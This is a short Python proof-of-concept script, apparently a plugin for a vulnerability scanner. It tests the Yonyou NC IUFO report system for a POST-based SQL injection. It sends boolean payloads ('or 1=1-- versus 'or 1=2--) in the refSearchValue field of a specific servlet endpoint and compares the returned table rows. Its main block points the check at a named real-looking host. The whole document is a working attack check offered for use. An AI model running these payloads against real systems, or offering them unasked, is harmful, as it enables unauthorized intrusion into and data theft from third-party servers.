#!/usr/bin/evn python 
#--*--coding:utf-8--*-- 



import re




#Author:wonderkun

#Name:用友NC-IUFO报表系统post sql注入

#Refer:http://www.wooyun.org/bugs/wooyun-2014-060988



def assign(service,arg):
    if service=="yongyou_nc":
        return True,arg

def audit(arg):
    url=arg+"service/~iufo/com.ufida.web.action.ActionServlet?RefTargetId=m_strUnitCode&onlyTwo=false&param_orgpk=level_code&retType=unit_code&Operation=Search&action=nc.ui.iufo.web.reference.base.UnitTableRefAction&method=execute"
    payload1="TreeSelectedID=&TableSelectedID=&refSearchProp=unit_code&refSearchPropLbl=%E5%8D%95%E4%BD%8D%E7%BC%96%E7%A0%81&refSearchOper=%3D&refSearchOperLbl=%E7%AD%89%E4%BA%8E&refSearchValue=%27or+1%3D1--"
    code1,head1,res1,errcode1,_=curl.curl2(url,post=payload1)
    payload2="TreeSelectedID=&TableSelectedID=&refSearchProp=unit_code&refSearchPropLbl=%E5%8D%95%E4%BD%8D%E7%BC%96%E7%A0%81&refSearchOper=%3D&refSearchOperLbl=%E7%AD%89%E4%BA%8E&refSearchValue=%27or+1%3D2--"
    code2,head2,res2,errcode2,_=curl.curl2(url,post=payload2)
    if(code1==200 and code2==200):
        rm1=re.findall("<tr\s*id='sortItem'",res1)
        rm2=re.findall("<tr\s*id='sortItem'",res2)
        if (len(rm1)!=len(rm2)):
            security_hole('sqlinject:POST [refSearchValue=>\'or 1=1]'+url)
 

if __name__ == '__main__':
    from dummy import * 
    audit(assign("yongyou_nc","http://nc.cnecc.com/")[1])
